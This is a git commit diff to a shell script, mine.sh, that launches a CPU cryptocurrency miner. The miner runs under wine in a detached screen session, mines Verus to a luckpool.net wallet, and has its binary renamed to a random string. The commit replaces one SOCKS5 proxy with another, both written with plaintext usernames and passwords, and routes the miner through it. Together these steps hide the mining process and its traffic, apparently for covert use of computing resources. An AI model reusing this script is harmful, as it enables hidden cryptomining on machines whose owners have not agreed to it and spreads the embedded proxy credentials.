96523d42bf58452114d0faccef6218f211188272
cvayoyo <145971481+Cvayoyo@users.noreply.github.com>
2026-04-11 04:27:45 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,8 +1,8 @@
 chmod +x * 
 cd ccminer_CPU_3.8.3 
 chmod +x * 
-proxy_url="socks5://LndDac:cYdYDA@196.16.3.155:9692"
+proxy_url="socks5://64oDwc:mTBPTN@161.115.231.65:9463"
 random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
 mv ccminer.exe $random_name.exe 
 chmod +x * 
-screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p d=16384S -t 4 "
+screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RGR7bDEzCXdfdLpLYv7gmpuPbPx6tP87iQ.yoah2 -p d=16384S -t 4 --proxy=$proxy_url"
